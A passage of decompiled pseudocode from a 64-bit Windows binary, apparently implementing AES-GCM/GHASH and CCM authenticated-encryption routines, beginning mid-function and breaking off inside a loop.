  v4 = a3;
  *(_QWORD *)a1 = 0i64;
  v5 = a2;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_QWORD *)(a1 + 368) = 0i64;
  if ( a3 == 12 )
  {
    v7 = 1;
    *(_QWORD *)a1 = a2->m128i_i64[0];
    *(_DWORD *)(a1 + 8) = a2->m128i_i32[2];
    *(_BYTE *)(a1 + 15) = 1;
  }
  else
  {
    v8 = a3;
    if ( a3 >= 0x10 )
    {
      v9 = a3 >> 4;
      v4 = -16i64 * (a3 >> 4) + a3;
      v10 = a1 + 15;
      do
      {
        if ( a1 > (unsigned __int64)v5->m128i_u64 + v10 - a1 || v10 < (unsigned __int64)v5 )
        {
          *(__m128i *)a1 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)a1), _mm_loadu_si128(v5));
        }
        else
        {
          v11 = (_BYTE *)a1;
          v12 = 16i64;
          do
          {
            *v11 ^= v11[(_QWORD)v5 - a1];
            ++v11;
            --v12;
          }
          while ( v12 );
        }
        sub_140092CE0((_BYTE *)a1, a1 + 96);
        ++v5;
        --v9;
      }
      while ( v9 );
      v8 = a3;
    }
    if ( v4 )
    {
      if ( v4 >= 0x20 && (a1 > (unsigned __int64)&v5[-1].m128i_u64[1] + v4 + 7 || v4 + a1 - 1 < (unsigned __int64)v5) )
      {
        v13 = (const __m128i *)a1;
        v14 = &v5->m128i_i8[-a1];
        do
        {
          v15 = _mm_loadu_si128(v13);
          v3 += 32i64;
          v16 = _mm_loadu_si128((const __m128i *)&v14[(_QWORD)v13]);
          v13 += 2;
          v13[-2] = _mm_xor_si128(v16, v15);
          v13[-1] = _mm_xor_si128(
                      _mm_loadu_si128((const __m128i *)((char *)v13 + (_QWORD)v14 - 16)),
                      _mm_loadu_si128(v13 - 1));
        }
        while ( v3 < (v4 & 0xFFFFFFFFFFFFFFE0ui64) );
      }
      if ( v3 < v4 )
      {
        v17 = &v5->m128i_i8[-a1];
        v18 = (_BYTE *)(v3 + a1);
        v19 = v4 - v3;
        do
        {
          *v18 ^= v18[(_QWORD)v17];
          ++v18;
          --v19;
        }
        while ( v19 );
      }
      sub_140092CE0((_BYTE *)a1, a1 + 96);
    }
    v20 = 8 * v8;
    *(_BYTE *)(a1 + 15) ^= v20;
    *(_BYTE *)(a1 + 8) ^= HIBYTE(v20);
    *(_BYTE *)(a1 + 9) ^= BYTE6(v20);
    *(_BYTE *)(a1 + 10) ^= BYTE5(v20);
    *(_BYTE *)(a1 + 11) ^= BYTE4(v20);
    *(_BYTE *)(a1 + 12) ^= BYTE3(v20);
    *(_BYTE *)(a1 + 13) ^= BYTE2(v20);
    *(_BYTE *)(a1 + 14) ^= BYTE1(v20);
    sub_140092CE0((_BYTE *)a1, a1 + 96);
    v7 = *(unsigned __int8 *)(a1 + 15) | ((*(unsigned __int8 *)(a1 + 14) | ((*(unsigned __int8 *)(a1 + 13) | (*(unsigned __int8 *)(a1 + 12) << 8)) << 8)) << 8);
  }
  (*(void (__fastcall **)(unsigned __int64, unsigned __int64, _QWORD))(a1 + 376))(a1, a1 + 32, *(_QWORD *)(a1 + 384));
  v21 = v7 + 1;
  *(_BYTE *)(a1 + 15) = v21;
  *(_BYTE *)(a1 + 12) = HIBYTE(v21);
  *(_BYTE *)(a1 + 13) = BYTE2(v21);
  result = v21 >> 8;
  *(_BYTE *)(a1 + 14) = BYTE1(v21);
  return result;
}

//----- (0000000140092AB0) ----------------------------------------------------
void *__fastcall sub_140092AB0(__int64 a1, void *a2, unsigned __int64 a3)
{
  size_t v6; // r8

  sub_1400925A0(a1, 0i64, 0i64);
  v6 = 16i64;
  if ( a3 <= 0x10 )
    v6 = a3;
  return memmove(a2, (const void *)(a1 + 64), v6);
}

//----- (0000000140092B10) ----------------------------------------------------
unsigned __int64 __fastcall sub_140092B10(_BYTE *a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned __int8 *v4; // r14
  _BYTE *v5; // rsi
  unsigned __int8 *v9; // rdi
  __int64 v10; // r15
  unsigned __int64 v11; // r9
  __int64 v12; // rcx
  unsigned __int64 v13; // r8
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // rbx
  unsigned __int64 result; // rax
  __int64 v17; // rcx
  __int64 v18; // rdx
  __int64 v19; // rdx
  unsigned __int64 v20; // r10
  __int64 v21; // rdx
  __int64 v22; // rcx
  unsigned __int64 v23; // r9
  unsigned __int64 v24; // rax
  unsigned __int64 v25; // r8

  v4 = (unsigned __int8 *)(a3 + 14);
  v5 = &a1[-a3];
  do
  {
    v9 = v4;
    v10 = 15i64;
    v11 = (unsigned __int8)a1[15] ^ (unsigned __int64)v4[1];
    v12 = 2 * (v11 & 0xF);
    v11 &= 0xFFFFFFFFFFFFFFF0ui64;
    v13 = *(_QWORD *)(a2 + 8 * v12);
    v14 = *(_QWORD *)(a2 + 8 * v12 + 8);
    v15 = *(_QWORD *)(v11 + a2) ^ (v13 >> 4) ^ qword_140118240[v14 & 0xF];
    result = *(_QWORD *)(v11 + a2 + 8) ^ ((v14 >> 4) | (v13 << 60));
    do
    {
      v17 = *v9;
      v18 = (v9--)[(_QWORD)v5];
      v19 = v17 ^ v18;
      v20 = v19 & 0xFFFFFFFFFFFFFFF0ui64;
      v21 = 2 * (v19 & 0xF);
      v22 = (*(_BYTE *)(a2 + 8 * v21 + 8) ^ (unsigned __int8)(result >> 4)) & 0xF;
      v23 = (*(_QWORD *)(a2 + 8 * v21 + 8) ^ ((result >> 4) | (v15 << 60))) >> 4;
      v24 = *(_QWORD *)(a2 + 8 * v21) ^ (v15 >> 4) ^ qword_140118240[result & 0xF];
      v25 = v24 >> 4;
      result = *(_QWORD *)(v20 + a2 + 8) ^ (v23 | (v24 << 60));
      v15 = *(_QWORD *)(v20 + a2) ^ v25 ^ qword_140118240[v22];
      --v10;
    }
    while ( v10 );
    a1[7] = v15;
    v4 += 16;
    a1[3] = BYTE4(v15);
    v5 -= 16;
    *a1 = HIBYTE(v15);
    a1[1] = BYTE6(v15);
    a1[2] = BYTE5(v15);
    a1[4] = BYTE3(v15);
    a1[5] = BYTE2(v15);
    a1[6] = BYTE1(v15);
    a1[11] = BYTE4(result);
    a1[8] = HIBYTE(result);
    a1[9] = BYTE6(result);
    a1[10] = BYTE5(result);
    a1[12] = BYTE3(result);
    a1[13] = BYTE2(result);
    a1[14] = BYTE1(result);
    a1[15] = result;
    a4 -= 16i64;
  }
  while ( a4 );
  return result;
}
// 140118240: using guessed type _QWORD qword_140118240[16];

//----- (0000000140092CE0) ----------------------------------------------------
__int64 __fastcall sub_140092CE0(_BYTE *a1, __int64 a2)
{
  __int64 v2; // r10
  __int64 v3; // rax
  __int64 v4; // rsi
  unsigned __int64 v5; // r11
  unsigned __int64 v6; // rbx
  unsigned __int64 v7; // r11
  __int64 v8; // r10
  __int64 v9; // rax
  unsigned __int64 v10; // r9
  unsigned __int64 v11; // r11
  unsigned __int64 v12; // r8
  __int64 result; // rax

  v2 = (unsigned __int8)a1[15];
  v3 = v2 & 0xF;
  v2 &= 0xFFFFFFFFFFFFFFF0ui64;
  v3 *= 2i64;
  v4 = 14i64;
  v5 = *(_QWORD *)(a2 + 8 * v3);
  v6 = *(_QWORD *)(v2 + a2) ^ (v5 >> 4) ^ qword_140118240[*(_QWORD *)(a2 + 8 * v3 + 8) & 0xFi64];
  v7 = *(_QWORD *)(v2 + a2 + 8) ^ ((*(_QWORD *)(a2 + 8 * v3 + 8) >> 4) | (v5 << 60));
  do
  {
    v8 = a1[v4] & 0xF0;
    v9 = (*(_BYTE *)(a2 + 16i64 * (a1[v4] & 0xF) + 8) ^ (unsigned __int8)(v7 >> 4)) & 0xF;
    v10 = (*(_QWORD *)(a2 + 16i64 * (a1[v4] & 0xF) + 8) ^ ((v7 >> 4) | (v6 << 60))) >> 4;
    v11 = *(_QWORD *)(a2 + 16i64 * (a1[v4] & 0xF)) ^ (v6 >> 4) ^ qword_140118240[v7 & 0xF];
    v12 = v11 >> 4;
    v7 = *(_QWORD *)(v8 + a2 + 8) ^ (v10 | (v11 << 60));
    v6 = *(_QWORD *)(v8 + a2) ^ v12 ^ qword_140118240[v9];
    --v4;
  }
  while ( v4 >= 0 );
  a1[3] = BYTE4(v6);
  *a1 = HIBYTE(v6);
  a1[1] = BYTE6(v6);
  a1[2] = BYTE5(v6);
  a1[4] = BYTE3(v6);
  a1[5] = BYTE2(v6);
  a1[6] = BYTE1(v6);
  a1[7] = v6;
  a1[8] = HIBYTE(v7);
  a1[9] = BYTE6(v7);
  a1[10] = BYTE5(v7);
  a1[12] = BYTE3(v7);
  a1[13] = BYTE2(v7);
  result = (unsigned int)v7 >> 8;
  a1[14] = BYTE1(v7);
  a1[11] = BYTE4(v7);
  a1[15] = v7;
  return result;
}
// 140118240: using guessed type _QWORD qword_140118240[16];

//----- (0000000140092E50) ----------------------------------------------------
unsigned __int64 __fastcall sub_140092E50(__m128i *a1, __m128i *a2)
{
  __m128i v3; // xmm2
  unsigned __int64 v4; // rcx
  __m128i v5; // xmm1
  __int64 v6; // rbp
  __int64 v7; // r14
  unsigned __int64 v8; // r13
  __int64 v9; // r8
  __int64 v10; // rdx
  unsigned __int64 v11; // xmm0_8
  unsigned __int64 v12; // rbx
  unsigned __int64 v13; // rsi
  unsigned __int64 v14; // r10
  unsigned __int64 v15; // xmm0_8
  __int64 v16; // rax
  unsigned __int64 result; // rax
  __m128i v18; // [rsp+0h] [rbp-38h]

  a1->m128i_i64[0] = 0i64;
  a1->m128i_i64[1] = 0i64;
  v3 = *a2;
  v4 = ((unsigned __int64)a2->m128i_i64[1] >> 1) | (a2->m128i_i64[0] << 63);
  v18.m128i_i64[1] = v4;
  v18.m128i_i64[0] = -(a2->m128i_i64[1] & 1) & 0xE100000000000000ui64 ^ ((unsigned __int64)a2->m128i_i64[0] >> 1);
  v5 = v18;
  v18.m128i_i64[0] = -(__int64)((a2->m128i_i64[1] & 2) != 0) & 0xE100000000000000ui64 ^ ((unsigned __int64)v18.m128i_i64[0] >> 1);
  v18.m128i_i64[1] = (v4 >> 1) | ((-(a2->m128i_i64[1] & 1) & 0xE100000000000000ui64 ^ ((unsigned __int64)a2->m128i_i64[0] >> 1)) << 63);
  a1[2] = v18;
  v6 = a1[2].m128i_i64[1];
  v7 = a1[2].m128i_i64[0];
  v18.m128i_i64[1] = ((unsigned __int64)v18.m128i_i64[1] >> 1) | (v18.m128i_i64[0] << 63);
  v8 = -(__int64)((v4 & 2) != 0) & 0xE100000000000000ui64 ^ ((unsigned __int64)v18.m128i_i64[0] >> 1) ^ v7;
  v18.m128i_i64[0] = -(__int64)((v4 & 2) != 0) & 0xE100000000000000ui64 ^ ((unsigned __int64)v18.m128i_i64[0] >> 1);
  a1[3].m128i_i64[0] = v8;
  a1[3].m128i_i64[1] = v18.m128i_i64[1] ^ v6;
  a1[1] = v18;
  v9 = a1[1].m128i_i64[0];
  v10 = a1[1].m128i_i64[1];
  v11 = _mm_srli_si128(v5, 8).m128i_u64[0];
  a1[5].m128i_i64[0] = v5.m128i_i64[0] ^ v9;
  v12 = v11 ^ v6;
  a1[6].m128i_i64[0] = v5.m128i_i64[0] ^ v7;
  v13 = v11 ^ v10;
  a1[6].m128i_i64[1] = v11 ^ v6;
  a1[5].m128i_i64[1] = v11 ^ v10;
  a1[7].m128i_i64[0] = v5.m128i_i64[0] ^ v8;
  a1[4] = v5;
  v14 = v11 ^ v18.m128i_i64[1] ^ v6;
  a1[7].m128i_i64[1] = v14;
  a1[8] = v3;
  v15 = _mm_srli_si128(v3, 8).m128i_u64[0];
  a1[9].m128i_i64[0] = v3.m128i_i64[0] ^ v9;
  a1[10].m128i_i64[1] = v15 ^ v6;
  a1[9].m128i_i64[1] = v15 ^ v10;
  a1[11].m128i_i64[1] = v15 ^ v18.m128i_i64[1] ^ v6;
  a1[10].m128i_i64[0] = v3.m128i_i64[0] ^ v7;
  a1[11].m128i_i64[0] = v3.m128i_i64[0] ^ v8;
  v16 = v3.m128i_i64[0] ^ a1[4].m128i_i64[0];
  a1[13].m128i_i64[1] = v15 ^ v13;
  a1[12].m128i_i64[0] = v16;
  result = v15 ^ a1[4].m128i_i64[1];
  a1[14].m128i_i64[1] = v15 ^ v12;
  a1[15].m128i_i64[1] = v15 ^ v14;
  a1[12].m128i_i64[1] = result;
  a1[13].m128i_i64[0] = v3.m128i_i64[0] ^ v5.m128i_i64[0] ^ v9;
  a1[14].m128i_i64[0] = v3.m128i_i64[0] ^ v5.m128i_i64[0] ^ v7;
  a1[15].m128i_i64[0] = v3.m128i_i64[0] ^ v5.m128i_i64[0] ^ v8;
  return result;
}
// 140092E50: using guessed type __m128i var_38;

//----- (0000000140093080) ----------------------------------------------------
void __fastcall sub_140093080(__int64 a1, _BYTE *a2, unsigned __int64 a3)
{
  void (__fastcall *v3)(__int64, __int64, _QWORD); // rbp
  unsigned __int64 v4; // rbx
  unsigned int v7; // edx
  _BYTE *v8; // rax

  if ( a3 )
  {
    v3 = *(void (__fastcall **)(__int64, __int64, _QWORD))(a1 + 40);
    v4 = a3;
    *(_BYTE *)a1 |= 0x40u;
    v3(a1, a1 + 16, *(_QWORD *)(a1 + 48));
    ++*(_QWORD *)(a1 + 32);
    if ( v4 >= 0xFF00 )
    {
      *(_BYTE *)(a1 + 16) = ~*(_BYTE *)(a1 + 16);
      if ( v4 < 0x100000000i64 )
      {
        *(_BYTE *)(a1 + 17) ^= 0xFEu;
        v7 = 6;
        *(_BYTE *)(a1 + 18) ^= BYTE3(v4);
        *(_BYTE *)(a1 + 19) ^= BYTE2(v4);
        *(_BYTE *)(a1 + 20) ^= BYTE1(v4);
        *(_BYTE *)(a1 + 21) ^= v4;
      }
      else
      {
        *(_BYTE *)(a1 + 17) = ~*(_BYTE *)(a1 + 17);
        v7 = 10;
        *(_BYTE *)(a1 + 18) ^= HIBYTE(v4);
        *(_BYTE *)(a1 + 19) ^= BYTE6(v4);
        *(_BYTE *)(a1 + 20) ^= BYTE5(v4);
        *(_BYTE *)(a1 + 21) ^= BYTE4(v4);
        *(_BYTE *)(a1 + 22) ^= BYTE3(v4);
        *(_BYTE *)(a1 + 23) ^= BYTE2(v4);
        *(_BYTE *)(a1 + 24) ^= BYTE1(v4);
        *(_BYTE *)(a1 + 25) ^= v4;
      }
    }
    else
    {
      v7 = 2;
      *(_BYTE *)(a1 + 16) ^= BYTE1(v4);
      *(_BYTE *)(a1 + 17) ^= v4;
    }
    do
    {
      v8 = (_BYTE *)(a1 + v7 + 16i64);
      do
      {
        if ( !v4 )
          break;
        ++v7;
        *v8++ ^= *a2++;
        --v4;
      }
      while ( v7 < 0x10 );
      v3(a1 + 16, a1 + 16, *(_QWORD *)(a1 + 48));
      ++*(_QWORD *)(a1 + 32);
      v7 = 0;
    }
    while ( v4 );
  }
}

//----- (00000001400931E0) ----------------------------------------------------
__int64 __fastcall sub_1400931E0(char *a1, _QWORD *a2, __int64 *a3, unsigned __int64 a4)
{
  char v4; // di
  void (__fastcall *v6)(char *, char *, __int64); // r14
  __int64 v8; // r15
  unsigned __int64 v11; // rsi
  int v12; // eax
  __int64 v13; // rcx
  char *v14; // rdx
  __int64 v15; // rdi
  __int64 v16; // rax
  unsigned __int64 v17; // rcx
  __int64 v19; // rax
  bool v20; // zf
  __int64 v21; // rax
  __int64 v22; // rax
  unsigned __int64 v23; // rdx
  char v24; // cl
  char v25; // [rsp+20h] [rbp-58h]
  unsigned int v26; // [rsp+24h] [rbp-54h]
  __int64 v27; // [rsp+28h] [rbp-50h] BYREF
  __int64 v28; // [rsp+30h] [rbp-48h]

  v4 = *a1;
  v6 = (void (__fastcall *)(char *, char *, __int64))*((_QWORD *)a1 + 5);
  v8 = *((_QWORD *)a1 + 6);
  v25 = *a1;
  if ( (*a1 & 0x40) == 0 )
    v6(a1, a1 + 16, v8);
  v11 = 0i64;
  v12 = v4 & 7;
  *a1 = v12;
  v13 = 0i64;
  v26 = 15 - v12;
  if ( (unsigned int)(15 - v12) < 0xF )
  {
    v14 = &a1[15 - v12];
    v15 = v4 & 7;
    do
    {
      v16 = (unsigned __int8)*v14;
      *v14++ = 0;
      v13 = (v16 | v13) << 8;
      --v15;
    }
    while ( v15 );
  }
  v17 = (unsigned __int8)a1[15] | (unsigned __int64)v13;
  a1[15] = 1;
  if ( v17 != a4 )
    return 0xFFFFFFFFi64;
  if ( a4 >= 0x10 )
  {
    v11 = a4 >> 4;
    a4 += -16i64 * (a4 >> 4);
    do
    {
      v6(a1, (char *)&v27, v8);
      LODWORD(v19) = 8;
      do
      {
        v19 = (unsigned int)(v19 - 1);
        v20 = a1[v19 + 8]++ == -1;
      }
      while ( v20 && (_DWORD)v19 );
      v21 = v27 ^ *a2;
      *a3 = v21;
      *((_QWORD *)a1 + 2) ^= v21;
      v22 = v28 ^ a2[1];
      a3[1] = v22;
      *((_QWORD *)a1 + 3) ^= v22;
      v6(a1 + 16, a1 + 16, v8);
      a2 += 2;
      a3 += 2;
      --v11;
    }
    while ( v11 );
  }
  if ( a4 )
  {
    v6(a1, (char *)&v27, v8);
    v23 = v11;
    do
    {
      LODWORD(v11) = v11 + 1;
      v24 = *((_BYTE *)&v27 + v23) ^ *((_BYTE *)a2 + v23);
      *((_BYTE *)a3 + v23) = v24;
      a1[v23 + 16] ^= v24;
      v23 = (unsigned int)v11;
    }
    while ( (unsigned int)v11 < a4 );
    v6(a1 + 16, a1 + 16, v8);
  }
  if ( v26 < 0x10 )
    memset(&a1[v26], 0, 16 - v26);
  v6(a1, (char *)&v27, v8);
  *((_QWORD *)a1 + 2) ^= v27;
  *((_QWORD *)a1 + 3) ^= v28;
  *a1 = v25;
  return 0i64;
}
// 140093325: conditional instruction was optimized away because rbp.8!=0

//----- (00000001400933C0) ----------------------------------------------------
__int64 __fastcall sub_1400933C0(
        char *a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        void (__fastcall *a5)(__int64, __int64, unsigned __int64, __int64, char *, __int64))
{
  char v5; // di
  unsigned __int64 v6; // rbp
  __int64 v7; // r10
  __int64 v9; // r15
  unsigned int v11; // esi
  int v12; // eax
  unsigned int v13; // r14d
  __int64 v14; // rcx
  char *v15; // rdx
  __int64 v16; // rdi
  __int64 v17; // rax
  unsigned __int64 v18; // rcx
  unsigned __int64 v20; // rdi
  __int64 v21; // r12
  unsigned __int64 v22; // rdi
  char *v23; // r8
  unsigned __int64 v24; // rdx
  __int64 v25; // rax
  unsigned __int64 v26; // rdx
  __int64 v27; // rdx
  char v28; // cl
  char v29; // [rsp+30h] [rbp-78h]
  void (__fastcall *v31)(char *, __int64 *, __int64, __int64); // [rsp+40h] [rbp-68h]
  __int64 v32[2]; // [rsp+48h] [rbp-60h] BYREF

  v5 = *a1;
  v6 = a4;
  v7 = a3;
  v9 = *((_QWORD *)a1 + 6);
  v29 = *a1;
  v31 = (void (__fastcall *)(char *, __int64 *, __int64, __int64))*((_QWORD *)a1 + 5);
  if ( (*a1 & 0x40) == 0 )
  {
    (*((void (__fastcall **)(char *, char *, __int64))a1 + 5))(a1, a1 + 16, v9);
    v7 = a3;
  }
  v11 = 0;
  v12 = v5 & 7;
  *a1 = v12;
  v13 = 15 - v12;
  v14 = 0i64;
  if ( (unsigned int)(15 - v12) < 0xF )
  {
    v15 = &a1[v13];
    v16 = v5 & 7;
    do
    {
      v17 = (unsigned __int8)*v15;
      *v15++ = 0;
      v14 = (v17 | v14) << 8;
      --v16;
    }
    while ( v16 );
  }
  v18 = (unsigned __int8)a1[15] | (unsigned __int64)v14;
  a1[15] = 1;
  if ( v18 != v6 )
    return 0xFFFFFFFFi64;
  if ( !(v6 >> 4) )
  {
    v21 = a3;
    goto LABEL_16;
  }
  a5(a2, v7, v6 >> 4, v9, a1, (__int64)(a1 + 16));
  v20 = 16 * (v6 >> 4);
  a2 += v20;
  v21 = v20 + a3;
  v6 -= v20;
  if ( v6 )
  {
    v22 = v20 >> 4;
    v23 = a1 + 16;
    v24 = 0i64;
    a4 = -(__int64)(a1 + 8);
    do
    {
      v25 = (unsigned __int8)*--v23;
      v26 = (unsigned __int8)v22 + v25 + v24;
      v22 >>= 8;
      *v23 = v26;
      v24 = v26 >> 8;
    }
    while ( v23 != a1 + 8 && (v22 || v24) );
LABEL_16:
    if ( v6 )
    {
      v31(a1, v32, v9, a4);
      v27 = 0i64;
      do
      {
        ++v11;
        v28 = *((_BYTE *)v32 + v27) ^ *(_BYTE *)(v27 + a2);
        *(_BYTE *)(v27 + v21) = v28;
        a1[v27 + 16] ^= v28;
        v27 = v11;
      }
      while ( v11 < v6 );
      ((void (__fastcall *)(char *, char *, __int64))v31)(a1 + 16, a1 + 16, v9);
    }
  }
  if ( v13 < 0x10 )
    memset(&a1[v13], 0, 16 - v13);
  ((void (__fastcall *)(char *, __int64 *, __int64))v31)(a1, v32, v9);
  *((_QWORD *)a1 + 2) ^= v32[0];
  *((_QWORD *)a1 + 3) ^= v32[1];
  *a1 = v29;
  return 0i64;
}
// 140093532: conditional instruction was optimized away because rbp.8!=0
// 14009352D: variable 'a4' is possibly undefined

//----- (00000001400935D0) ----------------------------------------------------
__int64 __fastcall sub_1400935D0(char *a1, _QWORD *a2, _QWORD *a3, unsigned __int64 a4)
{
  char v4; // r12
  void (__fastcall *v6)(__int64, __int64, __int64); // r14
  __int64 v8; // r15
  unsigned int v11; // eax
  __int64 v12; // r12
  unsigned int v13; // r13d
  __int64 v14; // rcx
  char *v15; // rdx
  __int64 v16; // r8
  __int64 v17; // rax
  unsigned __int64 v18; // rcx
  unsigned __int64 v20; // r14
  __int64 v21; // rax
  bool v22; // zf
  __int64 v23; // rax
  unsigned int v24; // edx
  __int64 v25; // rcx
  unsigned int v26; // edx
  __int64 v27; // rcx
  unsigned __int64 v28; // r8
  __int64 v29; // rax
  __m128i v30; // xmm0
  __int64 i; // rcx
  char v32; // [rsp+20h] [rbp-68h]
  unsigned int v33; // [rsp+24h] [rbp-64h]
  void (__fastcall *v34)(__int64, __int64, __int64); // [rsp+28h] [rbp-60h]
  __int128 v35; // [rsp+38h] [rbp-50h] BYREF

  v4 = *a1;
  v6 = (void (__fastcall *)(__int64, __int64, __int64))*((_QWORD *)a1 + 5);
  v8 = *((_QWORD *)a1 + 6);
  v32 = *a1;
  v34 = v6;
  if ( (*a1 & 0x40) == 0 )
  {
    v6((__int64)a1, (__int64)(a1 + 16), v8);
    ++*((_QWORD *)a1 + 4);
  }
  v11 = v4 & 7;
  v12 = 0i64;
  *a1 = v11;
  v13 = 15 - v11;
  v14 = 0i64;
  v33 = 15 - v11;
  if ( 15 - v11 < 0xF )
  {
    v15 = &a1[v13];
    v16 = v11;
    do
    {
      v17 = (unsigned __int8)*v15;
      *v15++ = 0;
      v14 = (v17 | v14) << 8;
      --v16;
    }
    while ( v16 );
  }
  v18 = (unsigned __int8)a1[15] | (unsigned __int64)v14;
  a1[15] = 1;
  if ( v18 != a4 )
    return 0xFFFFFFFFi64;
  *((_QWORD *)a1 + 4) += ((a4 + 15) | 8) >> 3;
  if ( *((_QWORD *)a1 + 4) > 0x2000000000000000ui64 )
    return 4294967294i64;
  if ( a4 >= 0x10 )
  {
    v20 = a4 >> 4;
    a4 += -16i64 * (a4 >> 4);
    do
    {
      *((_QWORD *)a1 + 2) ^= *a2;
      *((_QWORD *)a1 + 3) ^= a2[1];
      v34((__int64)(a1 + 16), (__int64)(a1 + 16), v8);
      v34((__int64)a1, (__int64)&v35, v8);
      LODWORD(v21) = 8;
      do
      {
        v21 = (unsigned int)(v21 - 1);
        v22 = a1[v21 + 8]++ == -1;
      }
      while ( v22 && (_DWORD)v21 );
      *a3 = v35 ^ *a2;
      v23 = a2[1];
      a2 += 2;
      a3[1] = *((_QWORD *)&v35 + 1) ^ v23;
      a3 += 2;
      --v20;
    }
    while ( v20 );
    v13 = v33;
    v12 = 0i64;
    v6 = v34;
  }
  if ( a4 )
  {
    v24 = 0;
    v25 = 0i64;
    do
    {
      ++v24;
      a1[v25 + 16] ^= *((_BYTE *)a2 + v25);
      v25 = v24;
    }
    while ( v24 < a4 );
    v6((__int64)(a1 + 16), (__int64)(a1 + 16), v8);
    v6((__int64)a1, (__int64)&v35, v8);
    v26 = 0;
    if ( a4 >= 0x20 )
    {
      v27 = (unsigned int)(a4 - 1);
      v28 = (unsigned __int64)a3 + v27;
      if ( (a3 > (_QWORD *)((char *)&v35 + v27) || v28 < (unsigned __int64)&v35)
        && (a3 > (_QWORD *)((char *)a2 + v27) || v28 < (unsigned __int64)a2) )
      {
        do
        {
          v29 = v26 + 16;
          v26 += 32;
          v30 = _mm_loadu_si128((const __m128i *)((char *)&v35 + v29));
          *(__m128i *)((char *)a3 + v12) = _mm_xor_si128(
                                             _mm_loadu_si128((const __m128i *)((char *)a2 + v12)),
                                             _mm_loadu_si128((const __m128i *)((char *)&v35 + v12)));
          v12 = v26;
          *(__m128i *)((char *)a3 + v29) = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)a2 + v29)), v30);
        }
        while ( v26 < (a4 & 0xFFFFFFFFFFFFFFE0ui64) );
      }
    }
    for ( i = v26; v26 < a4; i = v26 )
    {
      ++v26;
      *((_BYTE *)a3 + i) = *((_BYTE *)&v35 + i) ^ *((_BYTE *)a2 + i);
    }
  }
  if ( v13 < 0x10 )
    memset(&a1[v13], 0, 16 - v13);
  v6((__int64)a1, (__int64)&v35, v8);
  *((_OWORD *)a1 + 1) ^= v35;
  *a1 = v32;
  return 0i64;
}

//----- (0000000140093890) ----------------------------------------------------
__int64 __fastcall sub_140093890(
        char *a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        void (__fastcall *a5)(unsigned __int64, unsigned __int64, unsigned __int64, __int64, char *, __int64))
{
  char v5; // di
  __int64 v7; // r8
  __int64 v11; // r15
  int v12; // eax
  unsigned int v13; // r12d
  __int64 v14; // rcx
  char *v15; // rdx
  __int64 v16; // rdi
  __int64 v17; // rax
  unsigned __int64 v18; // rcx
  unsigned __int64 v20; // rdi
  unsigned __int64 v21; // rdi
  char *v22; // r8
  unsigned __int64 v23; // rdx
  __int64 v24; // rax
  unsigned __int64 v25; // rdx
  unsigned int v26; // edx
  __int64 v27; // rcx
  __int64 v28; // r13
  unsigned int v29; // edx
  __int64 v30; // rcx
  unsigned __int64 v31; // rdi
  __int64 v32; // rax
  __m128i v33; // xmm0
  __int64 i; // rcx
  char v35; // [rsp+30h] [rbp-78h]
  __int64 v36; // [rsp+38h] [rbp-70h]
  void (__fastcall *v37)(__int64, __int64, __int64); // [rsp+40h] [rbp-68h]
  __int128 v38; // [rsp+48h] [rbp-60h] BYREF

  v5 = *a1;
  v7 = *((_QWORD *)a1 + 6);
  v36 = v7;
  v35 = *a1;
  v37 = (void (__fastcall *)(__int64, __int64, __int64))*((_QWORD *)a1 + 5);
  if ( (*a1 & 0x40) == 0 )
  {
    (*((void (__fastcall **)(char *, char *))a1 + 5))(a1, a1 + 16);
    ++*((_QWORD *)a1 + 4);
    v7 = v36;
  }
  v11 = 0i64;
  v12 = v5 & 7;
  *a1 = v12;
  v13 = 15 - v12;
  v14 = 0i64;
  if ( (unsigned int)(15 - v12) < 0xF )
  {
    v15 = &a1[v13];
    v16 = v5 & 7;
    do
    {
      v17 = (unsigned __int8)*v15;
      *v15++ = 0;
      v14 = (v17 | v14) << 8;
      --v16;
    }
    while ( v16 );
  }
  v18 = (unsigned __int8)a1[15] | (unsigned __int64)v14;
  a1[15] = 1;
  if ( v18 != a4 )
    return 0xFFFFFFFFi64;
  *((_QWORD *)a1 + 4) += ((a4 + 15) | 8) >> 3;
  if ( *((_QWORD *)a1 + 4) > 0x2000000000000000ui64 )
    return 4294967294i64;
  if ( a4 >> 4 )
  {
    a5(a2, a3, a4 >> 4, v7, a1, (__int64)(a1 + 16));
    v20 = 16 * (a4 >> 4);
    a2 += v20;
    a3 += v20;
    a4 -= v20;
    if ( !a4 )
      goto LABEL_28;
    v21 = v20 >> 4;
    v22 = a1 + 16;
    v23 = 0i64;
    do
    {
      v24 = (unsigned __int8)*--v22;
      v25 = (unsigned __int8)v21 + v24 + v23;
      v21 >>= 8;
      *v22 = v25;
      v23 = v25 >> 8;
    }
    while ( v22 != a1 + 8 && (v21 || v23) );
  }
  if ( a4 )
  {
    v26 = 0;
    v27 = 0i64;
    do
    {
      ++v26;
      a1[v27 + 16] ^= *(_BYTE *)(v27 + a2);
      v27 = v26;
    }
    while ( v26 < a4 );
    v28 = v36;
    v37((__int64)(a1 + 16), (__int64)(a1 + 16), v36);
    v37((__int64)a1, (__int64)&v38, v36);
    v29 = 0;
    if ( a4 >= 0x20 )
    {
      v30 = (unsigned int)(a4 - 1);
      v31 = v30 + a3;
      if ( (a3 > (unsigned __int64)&v38 + v30 || v31 < (unsigned __int64)&v38) && (a3 > v30 + a2 || v31 < a2) )
      {
        do
        {
          v32 = v29 + 16;
          v29 += 32;
          v33 = _mm_loadu_si128((const __m128i *)((char *)&v38 + v32));
          *(__m128i *)(v11 + a3) = _mm_xor_si128(
                                     _mm_loadu_si128((const __m128i *)(v11 + a2)),
                                     _mm_loadu_si128((const __m128i *)((char *)&v38 + v11)));
          v11 = v29;
          *(__m128i *)(v32 + a3) = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(v32 + a2)), v33);
        }
        while ( v29 < (a4 & 0xFFFFFFFFFFFFFFE0ui64) );
      }
    }
    for ( i = v29; v29 < a4; i = v29 )
    {
      ++v29;
      *(_BYTE *)(i + a3) = *((_BYTE *)&v38 + i) ^ *(_BYTE *)(i + a2);
    }
